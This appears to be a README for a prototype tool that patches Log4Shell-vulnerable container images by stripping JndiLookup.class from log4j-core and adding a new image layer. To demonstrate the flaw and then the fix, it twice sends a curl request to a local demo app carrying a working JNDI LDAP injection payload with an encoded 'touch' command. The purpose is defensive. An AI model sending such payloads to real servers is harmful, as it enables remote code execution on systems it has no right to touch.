
# Patching container images

> **WARNING**: This is a demo/prototype. DO NOT USE FOR PRODUCTION!!!!**


## Preparation

Clone and build example application with log4j vulnerability

```
git clone https://github.com/christophetd/log4shell-vulnerable-app.git
cd log4shell-vulnerable-app
docker build . -t vulnerable-app
```

Run the application

```
docker run --rm -p 8080:8080 vulnerable-app
```

Make a request with payload and observe from logs that the application tried to connect to the LDAP server (you do not need to have LDAP server for this)

```
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```



## Patching vulnerable image

Clone this repository and use `extract` to extract the (suspected) vulnerable files.
It will go through all files in the source image and find `log4j-core` either directly as `jar` file or embedded within another `jar` file.
The command will extract all matching files to the `patch` directory.

```
go run cmd/extract/main.go -source-tag vulnerable-app -dest-dir patch
```

In this case, the `log4j-core` package is within executable `jar`.
Unzip the application to get to the `log4j-core` file

```
unzip -d jar patch/app/spring-boot-application.jar
```

Patch `log4j-core` by removing `JndiLookup.class` from the application `jar`

```
find jar -name log4j-core-* -exec zip -q -d {} org/apache/logging/log4j/core/lookup/JndiLookup.class \;
```

Create a new executable application jar and overwrite the vulnerable version with it

```
(cd jar; zip -0 -r ../patched-spring-boot-application.jar .)
mv patched-spring-boot-application.jar patch/app/spring-boot-application.jar
```

Create a new patched container image, with an additional layer.
The contents of the layer is loaded from the `patch` directory

```
go run cmd/patch/main.go -source-tag vulnerable-app -dest-tag patched-app -patch-dir patch
```

Run the test again with the patched application and observe that it is not vulnerable anymore

```
docker run --rm -p 8080:8080 patched-app
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
